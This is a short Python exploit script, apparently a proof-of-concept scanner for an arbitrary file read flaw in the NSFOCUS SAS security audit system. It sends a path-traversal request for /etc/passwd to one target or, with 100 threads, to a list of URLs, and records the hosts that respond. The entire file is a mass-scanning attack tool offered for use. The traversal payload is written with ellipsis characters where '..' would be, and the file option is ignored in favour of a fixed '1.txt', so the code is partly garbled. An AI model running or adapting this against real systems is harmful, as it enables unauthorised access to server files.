import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""
    __        __  ___                                      
   / / _   __/  |/  /__  ____  ____ _      _________ ______
  / / | | / / /|_/ / _ \/ __ \/ __ `/_____/ ___/ __ `/ ___/
 / /__| |/ / /  / /  __/ / / / /_/ /_____(__  ) /_/ (__  ) 
/_____/___/_/  /_/\___/_/ /_/\__, /     /____/\__,_/____/  
                            /____/                         
"""
    print(test)

def main():
    banner()
    parse = argparse.ArgumentParser(description="绿盟sas安全审计系统任意文件读取漏洞")
    parse.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parse.add_argument('-f','--file',dest='file',type=str,help="input your file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = "webconf/GetFile/index?path=…/…/…/…/…/…/…/…/…/…/…/…/…/…/etc/passwd"
    try:
        res = requests.get(url=target+payload,verify=False)
        if res.status_code==200 and '/bin/bash' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            return False
    except Exception as e:
        return False

if __name__ == "__main__":
    main()